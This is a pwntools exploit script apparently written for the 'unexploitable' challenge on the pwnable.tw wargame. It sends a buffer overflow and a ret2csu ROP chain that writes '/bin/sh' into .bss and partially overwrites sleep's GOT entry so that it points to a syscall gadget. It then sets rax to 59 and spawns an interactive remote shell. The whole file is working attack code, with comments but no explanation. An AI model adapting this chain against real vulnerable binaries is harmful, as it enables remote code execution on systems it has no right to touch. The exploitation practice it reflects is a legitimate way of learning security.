from pwn import *

#p = process("./unexploitable")
p = remote("chall.pwnable.tw",10403)
bin = ELF("./unexploitable")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#context.log_level = "debug"
read_got = bin.got['read']
bss_add = bin.bss()
main_add = bin.sym['main']
sleep_add = bin.got['sleep']

def rop_gadget(rbx,rbp,r12,r13,r14,r15,ret):
        tmp = p64(0)       # use to padding
        tmp += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
# assign value to  #rbx       #rbp      #call      #edi     #rsi         #rdx      #ret (return add)
        return tmp

#gdb.attach(p,"""b* 0x400571""")

payload1 = "A"*24 + p64(0x4005e6)                                       #padding and overwrite return address main funtion
payload1 += rop_gadget(0, 1, read_got, 0, bss_add+0x100, 8, 0x4005d0)   #use to call read() and write into address bss_add+0x100
payload1 += rop_gadget(0, 0, 0, 0, 0, 0, main_add)                      #return main()
p.sendline(payload1)

#pause()
sleep(7)
p.send("/bin/sh\x00")                                                   #write "/bin/sh\x00" into address bss_add+0x100 


payload2 = "A"*24 + p64(0x4005e6)                                       #padding and overwrite return address main funtion
payload2 += rop_gadget(0, 1, read_got, 0, sleep_add, 1, 0x4005d0)       #use to call read() and write into address sleep() .GOT
payload2 += rop_gadget(0, 1, read_got, 0, bss_add+0x120, 59, 0x4005d0)  #use to set rax = 59 (parameter of syscall execuve)
payload2 += rop_gadget(0, 1, sleep_add, bss_add+0x100, 0, 0, 0x4005d0)  #use to call sleep() with parameter is "/bin/sh"

#pause()
sleep(4)
p.send(payload2)

#pause()
sleep(4)
#p.send("\xc0")    # use in ubuntu 18.04 libc-2.27; use to write smallest-bit (in big-endian) of sleep() .GOT; sleep .GOT will point to syscall in pause()
p.send("\xde")   # use in the sever pwnable.tw; use to write smallest-bit (in big-endian) of sleep() .GOT; sleep .GOT will point to syscall in pause()

pause()
#sleep(4)
p.send("A"*59) #just use to set rax = 59

p.interactive()

